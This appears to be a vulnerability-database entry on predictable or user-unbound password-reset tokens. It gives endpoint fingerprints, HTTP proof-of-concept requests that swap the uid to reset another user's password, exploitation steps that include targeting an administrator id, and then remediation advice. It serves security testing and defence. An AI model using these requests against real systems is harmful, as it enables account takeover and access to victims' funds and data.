---
title: Predictable password-reset tokens / tokens not bound to users (arbitrary-user password changes)
cve: None (business logic)
severity: critical
cvss: 9.1
product: Custom password-recovery workflow
versions: Any
ports: 80, 443
keywords: reset, token, password recovery, arbitrary user, authorization bypass
entry: token = md5(uid) / token exposed in response / uid not validated
verified: false
sources: Compiled from public sources (business logic flaws; no CVE)
---

## Fingerprints

```
/api/user/findpwd        /api/user/resetPwd
/api/user/sendResetMail  /api/user/verifyToken
Responses may contain token / resetToken / uid
```

## Prerequisites

- Two accounts you own (A, B); ability to receive SMS/email (or in-app messages).

## PoC

```http
### 1) Request a reset and inspect the token format
POST /api/user/findpwd HTTP/1.1
Content-Type: application/json

{"phone":"13900000001"}

# If a token appears in the response/subsequent link: check whether it equals md5(uid), a timestamp, or a fixed value

### 2) Submit a reset with uid (a typical authorization-bypass point)
POST /api/user/resetPwd HTTP/1.1
Content-Type: application/json

{"uid":10002,"token":"<A-token>","newPwd":"Passw0rd!"}

### 3) Alternatively, change uid directly during verification
POST /api/user/verifyToken HTTP/1.1

{"uid":10002,"token":"<A-token>"}
```

## Exploitation Steps

1. Complete the workflow with A, recording the token and the request's `uid`/`phone`.
2. Test token formats: `md5(uid)`, `md5(phone)`, timestamp, six-digit number (brute-forceable).
3. Change `uid` to B / an administrator (commonly id=1), using A's token: a successful reset confirms an authorization bypass.
4. If the token is session-bound, replay after logout to check whether it remains valid (common with stateless tokens).
5. After changing the password, log into the target account and inspect funds/profile access; retain evidence only for your own two accounts.

## Remediation and Mitigation

- Generate tokens randomly server-side (≥128 bit) + single use + 10-minute expiry + sign together with uid (HMAC).
- The reset endpoint must use the uid derived from the token and ignore uid in the request body.
- Invalidate all sessions after a password change and notify the user.

## References

- OWASP Forgot Password Cheat Sheet; CWE-640.
